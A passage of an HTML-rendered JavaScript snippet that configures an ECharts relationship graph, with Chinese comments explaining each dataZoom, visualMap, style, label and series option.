class="hljs-literal">true</span>,                   <span class="hljs-comment">//如何触发缩放。可选值为：true：表示不按任何功能键，鼠标滚轮能触发缩放。false：表示鼠标滚轮不能触发缩放。&#x27;shift&#x27;：表示按住 shift 和鼠标滚轮能触发缩放。&#x27;ctrl&#x27;：表示按住 ctrl 和鼠标滚轮能触发缩放。&#x27;alt&#x27;：表示按住 alt 和鼠标滚轮能触发缩放。</span></span><span class="javascript">        moveOnMouseMove: <span class="hljs-literal">true</span>,                    <span class="hljs-comment">//如何触发数据窗口平移。true：表示不按任何功能键，鼠标移动能触发数据窗口平移。false：表示鼠标滚轮不能触发缩放。&#x27;shift&#x27;：表示按住 shift 和鼠标移动能触发数据窗口平移。&#x27;ctrl&#x27;：表示按住 ctrl 和鼠标移动能触发数据窗口平移。&#x27;alt&#x27;：表示按住 alt 和鼠标移动能触发数据窗口平移。</span></span>      &#125;    ];<span class="javascript">    <span class="hljs-keyword">const</span> visualMap = [                                     <span class="hljs-comment">//视觉映射组件，用于进行『视觉编码』，也就是将数据映射到视觉元素。视觉元素可以是：symbol: 图元的图形类别。symbolSize: 图元的大小。color: 图元的颜色。</span></span><span class="javascript">      <span class="hljs-comment">// colorAlpha: 图元的颜色的透明度。opacity: 图元以及其附属物（如文字标签）的透明度。colorLightness: 颜色的明暗度。colorSaturation: 颜色的饱和度。colorHue: 颜色的色调。</span></span>      &#123;<span class="javascript">        show: <span class="hljs-literal">true</span>,                              <span class="hljs-comment">//是否显示 visualMap-continuous 组件。如果设置为 false，不会显示，但是数据映射的功能还存在</span></span><span class="javascript">        type: <span class="hljs-string">&#x27;continuous&#x27;</span>,                     <span class="hljs-comment">// 定义为连续型 viusalMap</span></span><span class="javascript">        min: <span class="hljs-number">10</span>,                                  <span class="hljs-comment">//指定 visualMapContinuous 组件的允许的最小值</span></span><span class="javascript">        max: <span class="hljs-number">100</span>,                                 <span class="hljs-comment">//指定 visualMapContinuous 组件的允许的最大值</span></span><span class="javascript">        range: [<span class="hljs-number">15</span>, <span class="hljs-number">40</span>],                          <span class="hljs-comment">//指定手柄对应数值的位置。range 应在 min max 范围内</span></span><span class="javascript">        calculable: <span class="hljs-literal">true</span>,                        <span class="hljs-comment">//是否显示拖拽用的手柄（手柄能拖拽调整选中范围）</span></span><span class="javascript">        realtime: <span class="hljs-literal">true</span>,                          <span class="hljs-comment">//拖拽时，是否实时更新</span></span><span class="javascript">        inverse: <span class="hljs-literal">false</span>,                          <span class="hljs-comment">//是否反转 visualMap 组件</span></span><span class="javascript">        precision: <span class="hljs-number">0</span>,                            <span class="hljs-comment">//数据展示的小数精度，默认为0，无小数点</span></span><span class="javascript">        itemWidth: <span class="hljs-number">20</span>,                           <span class="hljs-comment">//图形的宽度，即长条的宽度。</span></span><span class="javascript">        itemHeight: <span class="hljs-number">140</span>,                         <span class="hljs-comment">//图形的高度，即长条的高度。</span></span><span class="javascript">        align: <span class="hljs-string">&quot;auto&quot;</span>,                           <span class="hljs-comment">//指定组件中手柄和文字的摆放位置.可选值为：&#x27;auto&#x27; 自动决定。&#x27;left&#x27; 手柄和label在右。&#x27;right&#x27; 手柄和label在左。&#x27;top&#x27; 手柄和label在下。&#x27;bottom&#x27; 手柄和label在上。</span></span><span class="javascript">        text: [<span class="hljs-string">&#x27;High&#x27;</span>, <span class="hljs-string">&#x27;Low&#x27;</span>],                   <span class="hljs-comment">//两端的文本</span></span><span class="javascript">        textGap: <span class="hljs-number">10</span>,                              <span class="hljs-comment">//两端文字主体之间的距离，单位为px</span></span><span class="javascript">        dimension: <span class="hljs-number">2</span>,                            <span class="hljs-comment">//指定用数据的『哪个维度』，映射到视觉元素上。『数据』即 series.data。 可以把 series.data 理解成一个二维数组,其中每个列是一个维度,默认取 data 中最后一个维度</span></span><span class="javascript">        seriesIndex: <span class="hljs-number">1</span>,                          <span class="hljs-comment">//指定取哪个系列的数据，即哪个系列的 series.data,默认取所有系列</span></span><span class="javascript">        hoverLink: <span class="hljs-literal">true</span>,                         <span class="hljs-comment">//鼠标悬浮到 visualMap 组件上时，鼠标位置对应的数值 在 图表中对应的图形元素，会高亮</span></span><span class="javascript">        inRange: &#123;                               <span class="hljs-comment">//定义 在选中范围中 的视觉元素</span></span><span class="javascript">          color: [<span class="hljs-string">&#x27;#121122&#x27;</span>, <span class="hljs-string">&#x27;rgba(3,4,5,0.4)&#x27;</span>, <span class="hljs-string">&#x27;red&#x27;</span>],</span>          symbolSize: [30, 100]        &#125;,<span class="javascript">        outOfRange: &#123;  <span class="hljs-comment">//定义 在选中范围外 的视觉元素。</span></span><span class="javascript">          color: [<span class="hljs-string">&#x27;#121122&#x27;</span>, <span class="hljs-string">&#x27;rgba(3,4,5,0.4)&#x27;</span>, <span class="hljs-string">&#x27;red&#x27;</span>],</span>          symbolSize: [30, 100]        &#125;,<span class="javascript">        zlevel: <span class="hljs-number">0</span>,                                   <span class="hljs-comment">//所属图形的Canvas分层，zlevel 大的 Canvas 会放在 zlevel 小的 Canvas 的上面</span></span><span class="javascript">        z: <span class="hljs-number">2</span>,                                         <span class="hljs-comment">//所属组件的z分层，z值小的图形会被z值大的图形覆盖</span></span><span class="javascript">        left: <span class="hljs-string">&quot;center&quot;</span>,                              <span class="hljs-comment">//组件离容器左侧的距离,&#x27;left&#x27;, &#x27;center&#x27;, &#x27;right&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">        top: <span class="hljs-string">&quot;top&quot;</span>,                                   <span class="hljs-comment">//组件离容器上侧的距离,&#x27;top&#x27;, &#x27;middle&#x27;, &#x27;bottom&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">        right: <span class="hljs-string">&quot;auto&quot;</span>,                               <span class="hljs-comment">//组件离容器右侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">        bottom: <span class="hljs-string">&quot;auto&quot;</span>,                              <span class="hljs-comment">//组件离容器下侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">        orient: <span class="hljs-string">&quot;vertical&quot;</span>,                         <span class="hljs-comment">//图例排列方向</span></span><span class="javascript">        padding: <span class="hljs-number">5</span>,                                   <span class="hljs-comment">//图例内边距，单位px  5  [5, 10]  [5,10,5,10]</span></span><span class="javascript">        backgroundColor: <span class="hljs-string">&quot;transparent&quot;</span>,            <span class="hljs-comment">//标题背景色</span></span><span class="javascript">        borderColor: <span class="hljs-string">&quot;#ccc&quot;</span>,                         <span class="hljs-comment">//边框颜色</span></span><span class="javascript">        borderWidth: <span class="hljs-number">0</span>,                               <span class="hljs-comment">//边框线宽</span></span><span class="javascript">        textStyle: mytextStyle,                      <span class="hljs-comment">//文本样式</span></span><span class="javascript">        formatter: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) </span>&#123;                 <span class="hljs-comment">//标签的格式化工具。</span></span><span class="javascript">          <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;aaaa&#x27;</span> + value;                    <span class="hljs-comment">// 范围标签显示内容。</span></span>        &#125;      &#125;,      &#123;<span class="javascript">        show: <span class="hljs-literal">true</span>,                          <span class="hljs-comment">//是否显示 visualMap-continuous 组件。如果设置为 false，不会显示，但是数据映射的功能还存在</span></span><span class="javascript">        type: <span class="hljs-string">&#x27;piecewise&#x27;</span>,                  <span class="hljs-comment">// 定义为分段型 visualMap</span></span><span class="javascript">        splitNumber: <span class="hljs-number">5</span>,                      <span class="hljs-comment">//对于连续型数据，自动平均切分成几段。默认为5段</span></span><span class="javascript">        pieces: [                           <span class="hljs-comment">//自定义『分段式视觉映射组件（visualMapPiecewise）』的每一段的范围，以及每一段的文字，以及每一段的特别的样式</span></span><span class="javascript">          &#123; <span class="hljs-attr">min</span>: <span class="hljs-number">1500</span> &#125;,                     <span class="hljs-comment">// 不指定 max，表示 max 为无限大（Infinity）。</span></span>          &#123; min: 900, max: 1500 &#125;,          &#123; min: 310, max: 1000 &#125;,          &#123; min: 200, max: 300 &#125;,<span class="javascript">          &#123; <span class="hljs-attr">min</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">max</span>: <span class="hljs-number">200</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">&#x27;10 到 200（自定义label）&#x27;</span> &#125;,</span><span class="javascript">          &#123; <span class="hljs-attr">value</span>: <span class="hljs-number">123</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">&#x27;123（自定义特殊颜色）&#x27;</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;grey&#x27;</span> &#125;, <span class="hljs-comment">// 表示 value 等于 123 的情况。</span></span><span class="javascript">          &#123; <span class="hljs-attr">max</span>: <span class="hljs-number">5</span> &#125;                        <span class="hljs-comment">// 不指定 min，表示 min 为无限大（-Infinity）。</span></span>        ],<span class="javascript">        categories: [<span class="hljs-string">&#x27;严重污染&#x27;</span>, <span class="hljs-string">&#x27;重度污染&#x27;</span>, <span class="hljs-string">&#x27;中度污染&#x27;</span>, <span class="hljs-string">&#x27;轻度污染&#x27;</span>, <span class="hljs-string">&#x27;良&#x27;</span>, <span class="hljs-string">&#x27;优&#x27;</span>],  <span class="hljs-comment">//用于表示离散型数据（或可以称为类别型数据、枚举型数据）的全集</span></span><span class="javascript">        min: <span class="hljs-number">10</span>,                             <span class="hljs-comment">//指定 visualMapContinuous 组件的允许的最小值</span></span><span class="javascript">        max: <span class="hljs-number">100</span>,                             <span class="hljs-comment">//指定 visualMapContinuous 组件的允许的最大值</span></span><span class="javascript">        minOpen: <span class="hljs-literal">true</span>,                       <span class="hljs-comment">//界面上会额外多出一个『&lt; min』的选块</span></span><span class="javascript">        maxOpen: <span class="hljs-literal">true</span>,                       <span class="hljs-comment">//界面上会额外多出一个『&gt; max』的选块。</span></span><span class="javascript">        selectedMode: <span class="hljs-string">&quot;multiple&quot;</span>,           <span class="hljs-comment">//选择模式，可以是：&#x27;multiple&#x27;（多选）。&#x27;single&#x27;（单选）。</span></span><span class="javascript">        inverse: <span class="hljs-literal">false</span>,                      <span class="hljs-comment">//是否反转 visualMap 组件</span></span><span class="javascript">        precision: <span class="hljs-number">0</span>,                        <span class="hljs-comment">//数据展示的小数精度，默认为0，无小数点</span></span><span class="javascript">        itemWidth: <span class="hljs-number">20</span>,                       <span class="hljs-comment">//图形的宽度，即长条的宽度。</span></span><span class="javascript">        itemHeight: <span class="hljs-number">140</span>,                     <span class="hljs-comment">//图形的高度，即长条的高度。</span></span><span class="javascript">        align: <span class="hljs-string">&quot;auto&quot;</span>,                       <span class="hljs-comment">//指定组件中手柄和文字的摆放位置.可选值为：&#x27;auto&#x27; 自动决定。&#x27;left&#x27; 手柄和label在右。&#x27;right&#x27; 手柄和label在左。&#x27;top&#x27; 手柄和label在下。&#x27;bottom&#x27; 手柄和label在上。</span></span><span class="javascript">        text: [<span class="hljs-string">&#x27;High&#x27;</span>, <span class="hljs-string">&#x27;Low&#x27;</span>],               <span class="hljs-comment">//两端的文本</span></span><span class="javascript">        textGap: <span class="hljs-number">10</span>,                          <span class="hljs-comment">//两端文字主体之间的距离，单位为px</span></span><span class="javascript">        showLabel: <span class="hljs-literal">true</span>,                     <span class="hljs-comment">//是否显示每项的文本标签</span></span><span class="javascript">        itemGap: <span class="hljs-number">10</span>,                          <span class="hljs-comment">//每两个图元之间的间隔距离，单位为px</span></span><span class="javascript">        itemSymbol: <span class="hljs-string">&quot;roundRect&quot;</span>,             <span class="hljs-comment">//默认的图形。可选值为： &#x27;circle&#x27;, &#x27;rect&#x27;, &#x27;roundRect&#x27;, &#x27;triangle&#x27;, &#x27;diamond&#x27;, &#x27;pin&#x27;, &#x27;arrow&#x27;</span></span><span class="javascript">        dimension: <span class="hljs-number">2</span>,                          <span class="hljs-comment">//指定用数据的『哪个维度』，映射到视觉元素上。『数据』即 series.data。 可以把 series.data 理解成一个二维数组,其中每个列是一个维度,默认取 data 中最后一个维度</span></span><span class="javascript">        seriesIndex: <span class="hljs-number">1</span>,                        <span class="hljs-comment">//指定取哪个系列的数据，即哪个系列的 series.data,默认取所有系列</span></span><span class="javascript">        hoverLink: <span class="hljs-literal">true</span>,                      <span class="hljs-comment">//鼠标悬浮到 visualMap 组件上时，鼠标位置对应的数值 在 图表中对应的图形元素，会高亮</span></span><span class="javascript">        inRange: &#123;                             <span class="hljs-comment">//定义 在选中范围中 的视觉元素</span></span><span class="javascript">          color: [<span class="hljs-string">&#x27;#121122&#x27;</span>, <span class="hljs-string">&#x27;rgba(3,4,5,0.4)&#x27;</span>, <span class="hljs-string">&#x27;red&#x27;</span>],</span>          symbolSize: [30, 100]        &#125;,<span class="javascript">        outOfRange: &#123;                            <span class="hljs-comment">//定义 在选中范围外 的视觉元素。</span></span><span class="javascript">          color: [<span class="hljs-string">&#x27;#121122&#x27;</span>, <span class="hljs-string">&#x27;rgba(3,4,5,0.4)&#x27;</span>, <span class="hljs-string">&#x27;red&#x27;</span>],</span>          symbolSize: [30, 100]        &#125;,<span class="javascript">        zlevel: <span class="hljs-number">0</span>,                                   <span class="hljs-comment">//所属图形的Canvas分层，zlevel 大的 Canvas 会放在 zlevel 小的 Canvas 的上面</span></span><span class="javascript">        z: <span class="hljs-number">2</span>,                                         <span class="hljs-comment">//所属组件的z分层，z值小的图形会被z值大的图形覆盖</span></span><span class="javascript">        left: <span class="hljs-string">&quot;center&quot;</span>,                              <span class="hljs-comment">//组件离容器左侧的距离,&#x27;left&#x27;, &#x27;center&#x27;, &#x27;right&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">        top: <span class="hljs-string">&quot;top&quot;</span>,                                   <span class="hljs-comment">//组件离容器上侧的距离,&#x27;top&#x27;, &#x27;middle&#x27;, &#x27;bottom&#x27;,&#x27;20%&#x27;</span></span><span class="javascript">        right: <span class="hljs-string">&quot;auto&quot;</span>,                               <span class="hljs-comment">//组件离容器右侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">        bottom: <span class="hljs-string">&quot;auto&quot;</span>,                              <span class="hljs-comment">//组件离容器下侧的距离,&#x27;20%&#x27;</span></span><span class="javascript">        orient: <span class="hljs-string">&quot;vertical&quot;</span>,                        <span class="hljs-comment">//图例排列方向</span></span><span class="javascript">        padding: <span class="hljs-number">5</span>,                                   <span class="hljs-comment">//图例内边距，单位px  5  [5, 10]  [5,10,5,10]</span></span><span class="javascript">        backgroundColor: <span class="hljs-string">&quot;transparent&quot;</span>,            <span class="hljs-comment">//标题背景色</span></span><span class="javascript">        borderColor: <span class="hljs-string">&quot;#ccc&quot;</span>,                         <span class="hljs-comment">//边框颜色</span></span><span class="javascript">        borderWidth: <span class="hljs-number">0</span>,                               <span class="hljs-comment">//边框线宽</span></span><span class="javascript">        textStyle: mytextStyle,                      <span class="hljs-comment">//文本样式</span></span><span class="javascript">        formatter: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) </span>&#123;                <span class="hljs-comment">//标签的格式化工具。</span></span><span class="javascript">          <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;aaaa&#x27;</span> + value;                   <span class="hljs-comment">// 范围标签显示内容。</span></span>        &#125;      &#125;    ];<span class="javascript">    <span class="hljs-keyword">const</span> mytextStyle = &#123;</span><span class="javascript">      color: <span class="hljs-string">&quot;#333&quot;</span>,               <span class="hljs-comment">//文字颜色</span></span><span class="javascript">      fontStyle: <span class="hljs-string">&quot;normal&quot;</span>,         <span class="hljs-comment">//italic斜体  oblique倾斜</span></span><span class="javascript">      fontWeight: <span class="hljs-string">&quot;normal&quot;</span>,        <span class="hljs-comment">//文字粗细bold   bolder   lighter  100 | 200 | 300 | 400...</span></span><span class="javascript">      fontFamily: <span class="hljs-string">&quot;sans-serif&quot;</span>,    <span class="hljs-comment">//字体系列</span></span><span class="javascript">      fontSize: <span class="hljs-number">18</span>,                  <span class="hljs-comment">//字体大小</span></span>    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> mylineStyle = &#123;</span><span class="javascript">      color: <span class="hljs-string">&quot;#333&quot;</span>,               <span class="hljs-comment">//颜色，&#x27;rgb(128, 128, 128)&#x27;，&#x27;rgba(128, 128, 128, 0.5)&#x27;，支持线性渐变，径向渐变，纹理填充</span></span><span class="javascript">      shadowColor: <span class="hljs-string">&quot;red&quot;</span>,          <span class="hljs-comment">//阴影颜色</span></span><span class="javascript">      shadowOffsetX: <span class="hljs-number">0</span>,            <span class="hljs-comment">//阴影水平方向上的偏移距离。</span></span><span class="javascript">      shadowOffsetY: <span class="hljs-number">0</span>,            <span class="hljs-comment">//阴影垂直方向上的偏移距离</span></span><span class="javascript">      shadowBlur: <span class="hljs-number">10</span>,              <span class="hljs-comment">//图形阴影的模糊大小。</span></span><span class="javascript">      type: <span class="hljs-string">&quot;solid&quot;</span>,               <span class="hljs-comment">//坐标轴线线的类型，solid，dashed，dotted</span></span><span class="javascript">      width: <span class="hljs-number">1</span>,                    <span class="hljs-comment">//坐标轴线线宽</span></span><span class="javascript">      opacity: <span class="hljs-number">1</span>,                  <span class="hljs-comment">//图形透明度。支持从 0 到 1 的数字，为 0 时不绘制该图形</span></span>    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> myareaStyle = &#123;</span><span class="javascript">      color: [<span class="hljs-string">&#x27;rgba(250,250,250,0.3)&#x27;</span>, <span class="hljs-string">&#x27;rgba(200,200,200,0.3)&#x27;</span>],<span class="hljs-comment">//分隔区域颜色。分隔区域会按数组中颜色的顺序依次循环设置颜色。默认是一个深浅的间隔色。</span></span><span class="javascript">      shadowColor: <span class="hljs-string">&quot;red&quot;</span>,          <span class="hljs-comment">//阴影颜色</span></span><span class="javascript">      shadowOffsetX: <span class="hljs-number">0</span>,            <span class="hljs-comment">//阴影水平方向上的偏移距离。</span></span><span class="javascript">      shadowOffsetY: <span class="hljs-number">0</span>,            <span class="hljs-comment">//阴影垂直方向上的偏移距离</span></span><span class="javascript">      shadowBlur: <span class="hljs-number">10</span>,              <span class="hljs-comment">//图形阴影的模糊大小。</span></span><span class="javascript">      opacity: <span class="hljs-number">1</span>,                  <span class="hljs-comment">//图形透明度。支持从 0 到 1 的数字，为 0 时不绘制该图形</span></span>    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> myitemStyle = &#123;</span><span class="javascript">      color: <span class="hljs-string">&quot;blue&quot;</span>,                 <span class="hljs-comment">//颜色</span></span><span class="javascript">      borderColor: <span class="hljs-string">&quot;#000&quot;</span>,         <span class="hljs-comment">//边框颜色</span></span><span class="javascript">      borderWidth: <span class="hljs-number">0</span>,              <span class="hljs-comment">//柱条的描边宽度，默认不描边。</span></span><span class="javascript">      borderType: <span class="hljs-string">&quot;solid&quot;</span>,         <span class="hljs-comment">//柱条的描边类型，默认为实线，支持 &#x27;dashed&#x27;, &#x27;dotted&#x27;。</span></span><span class="javascript">      barBorderRadius: <span class="hljs-number">0</span>,          <span class="hljs-comment">//柱形边框圆角半径，单位px，支持传入数组分别指定柱形4个圆角半径。</span></span><span class="javascript">      shadowBlur: <span class="hljs-number">10</span>,              <span class="hljs-comment">//图形阴影的模糊大小。</span></span><span class="javascript">      shadowColor: <span class="hljs-string">&quot;#000&quot;</span>,         <span class="hljs-comment">//阴影颜色</span></span><span class="javascript">      shadowOffsetX: <span class="hljs-number">0</span>,            <span class="hljs-comment">//阴影水平方向上的偏移距离。</span></span><span class="javascript">      shadowOffsetY: <span class="hljs-number">0</span>,            <span class="hljs-comment">//阴影垂直方向上的偏移距离。</span></span><span class="javascript">      opacity: <span class="hljs-number">1</span>,                  <span class="hljs-comment">//图形透明度。支持从 0 到 1 的数字，为 0 时不绘制该图形。</span></span>    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> mylabel = &#123;</span><span class="javascript">      show: <span class="hljs-literal">false</span>,                  <span class="hljs-comment">//是否显示标签。</span></span><span class="javascript">      position: <span class="hljs-string">&quot;inside&quot;</span>,          <span class="hljs-comment">//标签的位置。// 绝对的像素值[10, 10],// 相对的百分比[&#x27;50%&#x27;, &#x27;50%&#x27;].&#x27;top&#x27;,&#x27;left&#x27;,&#x27;right&#x27;,&#x27;bottom&#x27;,&#x27;inside&#x27;,&#x27;insideLeft&#x27;,&#x27;insideRight&#x27;,&#x27;insideTop&#x27;,&#x27;insideBottom&#x27;,&#x27;insideTopLeft&#x27;,&#x27;insideBottomLeft&#x27;,&#x27;insideTopRight&#x27;,&#x27;insideBottomRight&#x27;</span></span><span class="javascript">      offset: [<span class="hljs-number">30</span>, <span class="hljs-number">40</span>],             <span class="hljs-comment">//是否对文字进行偏移。默认不偏移。例如：[30, 40] 表示文字在横向上偏移 30，纵向上偏移 40。</span></span><span class="javascript">      formatter: <span class="hljs-string">&#x27;&#123;b&#125;: &#123;c&#125;&#x27;</span>,       <span class="hljs-comment">//标签内容格式器。模板变量有 &#123;a&#125;、&#123;b&#125;、&#123;c&#125;，分别表示系列名，数据名，数据值。</span></span>      textStyle: mytextStyle    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> mypoint = &#123;</span><span class="javascript">      symbol: <span class="hljs-string">&quot;pin&quot;</span>,               <span class="hljs-comment">//图形 &#x27;circle&#x27;, &#x27;rect&#x27;, &#x27;roundRect&#x27;, &#x27;triangle&#x27;, &#x27;diamond&#x27;, &#x27;pin&#x27;, &#x27;arrow&#x27;</span></span><span class="javascript">      symbolSize: <span class="hljs-number">50</span>,              <span class="hljs-comment">//标记的大小，可以设置成诸如 10 这样单一的数字，也可以用数组分开表示宽和高，例如 [20, 10] 表示标记宽为20，高为10。</span></span><span class="javascript">      symbolRotate: <span class="hljs-number">0</span>,             <span class="hljs-comment">//标记的旋转角度。注意在 markLine 中当 symbol 为 &#x27;arrow&#x27; 时会忽略 symbolRotate 强制设置为切线的角度。</span></span><span class="javascript">      symbolOffset: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],         <span class="hljs-comment">//标记相对于原本位置的偏移。默认情况下，标记会居中置放在数据对应的位置</span></span><span class="javascript">      silent: <span class="hljs-literal">false</span>,               <span class="hljs-comment">//图形是否不响应和触发鼠标事件，默认为 false，即响应和触发鼠标事件。</span></span>      label: &#123;        normal: mylabel,        emphasis: mylabel      &#125;,      itemStyle: &#123;        normal: myitemStyle,        emphasis: myitemStyle      &#125;    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> myline = &#123;</span><span class="javascript">      symbol: [<span class="hljs-string">&quot;pin&quot;</span>, <span class="hljs-string">&quot;circle&quot;</span>],    <span class="hljs-comment">//图形 &#x27;circle&#x27;, &#x27;rect&#x27;, &#x27;roundRect&#x27;, &#x27;triangle&#x27;, &#x27;diamond&#x27;, &#x27;pin&#x27;, &#x27;arrow&#x27;</span></span><span class="javascript">      symbolSize: <span class="hljs-number">50</span>,              <span class="hljs-comment">//标记的大小，可以设置成诸如 10 这样单一的数字，也可以用数组分开表示宽和高，例如 [20, 10] 表示标记宽为20，高为10。</span></span><span class="javascript">      precision: <span class="hljs-number">2</span>,                <span class="hljs-comment">//标线数值的精度，在显示平均值线的时候有用。</span></span><span class="javascript">      silent: <span class="hljs-literal">false</span>,               <span class="hljs-comment">//图形是否不响应和触发鼠标事件，默认为 false，即响应和触发鼠标事件。</span></span>      label: &#123;        normal: mylabel,        emphasis: mylabel      &#125;,      lineStyle: &#123;        normal: mylineStyle,        emphasis: mylineStyle      &#125;    &#125;;<span class="javascript">    <span class="hljs-keyword">const</span> myarea = &#123;</span><span class="javascript">      silent: <span class="hljs-literal">false</span>,               <span class="hljs-comment">//图形是否不响应和触发鼠标事件，默认为 false，即响应和触发鼠标事件。</span></span>      label: &#123;        normal: mylabel,        emphasis: mylabel      &#125;,      itemStyle: &#123;        normal: myitemStyle,        emphasis: myitemStyle      &#125;    &#125;;<span class="javascript">    <span class="hljs-keyword">return</span> &#123;</span>      options: &#123;<span class="javascript">        title: title,<span class="hljs-comment">// 标题设置</span></span><span class="javascript">        tooltip: tooltip,<span class="hljs-comment">// 节点悬浮提示</span></span><span class="javascript">        <span class="hljs-comment">// toolbox: toolbox,// 切换下载</span></span><span class="javascript">        legend: legend,<span class="hljs-comment">// 分组筛选提示</span></span><span class="javascript">        <span class="hljs-comment">// dataZoom: dataZoom,// 可缩放</span></span><span class="javascript">        <span class="hljs-comment">// visualMap: visualMap,// 地图映射</span></span><span class="javascript">        animationDurationUpdate: <span class="hljs-number">1500</span>, <span class="hljs-comment">// 动画的时长。</span></span><span class="javascript">        animationEasingUpdate: <span class="hljs-string">&#x27;quinticInOut&#x27;</span>, <span class="hljs-comment">// 动画的加载效果</span></span><span class="javascript">        <span class="hljs-comment">// hasChanged: false,</span></span><span class="javascript">        <span class="hljs-comment">// flag: false,</span></span>        series: [          &#123;<span class="javascript">            type: <span class="hljs-string">&quot;graph&quot;</span>,               <span class="hljs-comment">//关系图</span></span><span class="javascript">            <span class="hljs-comment">// zlevel: 0,                   //柱状图所有图形的 zlevel 值。</span></span><span class="javascript">            <span class="hljs-comment">// z: 2,                         //柱状图组件的所有图形的z值。控制图形的前后顺序。z值小的图形会被z值大的图形覆盖。</span></span><span class="javascript">            <span class="hljs-comment">// left: &quot;10%&quot;,                 //组件离容器左侧的距离,百分比字符串或整型数字</span></span><span class="javascript">            top: <span class="hljs-string">&#x27;15%&#x27;</span>,                      <span class="hljs-comment">//组件离容器上侧的距离，百分比字符串或整型数字</span></span><span class="javascript">            <span class="hljs-comment">// right: &quot;auto&quot;,               //组件离容器右侧的距离,百分比字符串或整型数字</span></span><span class="javascript">            bottom: <span class="hljs-string">&quot;15%&quot;</span>,              <span class="hljs-comment">//组件离容器下侧的距离,百分比字符串或整型数字</span></span><span class="javascript">            <span class="hljs-comment">// width: &quot;auto&quot;,               //图例宽度</span></span><span class="javascript">            <span class="hljs-comment">// height: &quot;auto&quot;,              //图例高度</span></span><span class="javascript">            <span class="hljs-comment">// silent: false,               //图形是否不响应和触发鼠标事件，默认为 false，即响应和触发鼠标事件。</span></span><span class="javascript">            <span class="hljs-comment">// name: &quot;公共特征&quot;,            //系列名称，用于tooltip的显示，legend 的图例筛选，在 setOption 更新数据和配置项时用于指定对应的系列。</span></span><span class="javascript">            <span class="hljs-comment">// legendHoverLink: true,       //是否启用图例 hover 时的联动高亮。</span></span><span class="javascript">            <span class="hljs-comment">// hoverAnimation: true,        //是否开启鼠标 hover 节点的提示动画效果。</span></span><span class="javascript">            <span class="hljs-comment">// coordinateSystem: null,      //null无坐标系，&#x27;cartesia个人特征d&#x27;使用二维的直角坐标系。&#x27;geo&#x27;使用地理坐标系，&#x27;polar&#x27;使用极坐标系</span></span><span class="javascript">            <span class="hljs-comment">// xAxisIndex: 0,                //使用的 x 轴的 index，在单个图表实例中存在多个 x 轴的时候有用。</span></span><span class="javascript">            <span class="hljs-comment">// yAxisIndex: 0,                //使用的 y 轴的 index，在单个图表实例中存在多个 y轴的时候有用。</span></span><span class="javascript">            <span class="hljs-comment">// polarIndex: 0,                //使用的极坐标系的 index，在单个图表实例中存在多个极坐标系的时候有用。</span></span><span class="javascript">            <span class="hljs-comment">// geoIndex: 0,                  //使用的地理坐标系的 index，在单个图表实例中存在多个地理坐标系的时候有用。</span></span><span class="javascript">            <span class="hljs-comment">// calendarIndex: 0,            //使用的日历坐标系的 index，在单个图表实例中存在多个日历坐标系的时候有用。</span></span><span class="javascript">            layout: <span class="hljs-string">&#x27;circular&#x27;</span>,              <span class="hljs-comment">//&#x27;none&#x27; 不采用任何布局，使用节点中提供的 x， y 作为节点的位置.&#x27;circular&#x27; 采用环形布局，&#x27;force&#x27; 采用力引导布局。</span></span><span class="javascript">            <span class="hljs-comment">//circular:&#123;&#125;,               //环形布局相关配置</span></span><span class="javascript">            <span class="hljs-comment">//force:&#123;&#125;,                  //力引导布局相关的配置项</span></span><span class="javascript">            roam: <span class="hljs-literal">true</span>,                 <span class="hljs-comment">//是否开启鼠标缩放和平移漫游。默认不开启。如果只想要开启缩放或者平移，可以设置成 &#x27;scale&#x27; 或者 &#x27;move&#x27;。设置成 true 为都开启</span></span><span class="javascript">            nodeScaleRatio: <span class="hljs-number">0.6</span>,         <span class="hljs-comment">//鼠标漫游缩放时节点的相应缩放比例，当设为0时节点不随着鼠标的缩放而缩放</span></span><span class="javascript">            <span class="hljs-comment">// draggable: true,            //节点是否可拖拽，只在使用力引导布局的时候有用。</span></span><span class="javascript">            <span class="hljs-comment">// focusNodeAdjacency: true,   //是否在鼠标移到节点上的时候突出显示节点以及节点的边和邻接节点。放大</span></span><span class="javascript">            symbol: <span class="hljs-string">&quot;circle&quot;</span>,               <span class="hljs-comment">//图形 &#x27;circle&#x27;, &#x27;rect&#x27;, &#x27;roundRect&#x27;, &#x27;triangle&#x27;, &#x27;diamond&#x27;, &#x27;pin&#x27;, &#x27;arrow&#x27;</span></span><span class="javascript">            symbolSize: <span class="hljs-number">50</span>,              <span class="hljs-comment">//标记的大小，可以设置成诸如 10 这样单一的数字，也可以用数组分开表示宽和高，例如 [20, 10] 表示标记宽为20，高为10。</span></span><span class="javascript">            <span class="hljs-comment">// symbolRotate: 0,             //标记的旋转角度。注意在 markLine 中当 symbol 为 &#x27;arrow&#x27; 时会忽略 symbolRotate 强制设置为切线的角度。</span></span><span class="javascript">            <span class="hljs-comment">// symbolOffset: [0, 0],         //标记相对于原本位置的偏移。默认情况下，标记会居中置放在数据对应的位置</span></span><span class="javascript">            edgeSymbol: [<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;arrow&#x27;</span>],<span class="hljs-comment">//边两端的标记类型，可以是一个数组分别指定两端，也可以是单个统一指定。默认不显示标记，常见的可以设置为箭头</span></span><span class="javascript">            <span class="hljs-comment">// edgeSymbolSize: [5, 2],       //边两端的标记大小，可以是一个数组分别指定两端，也可以是单个统一指定。</span></span><span class="javascript">            cursor: <span class="hljs-string">&quot;pointer&quot;</span>,           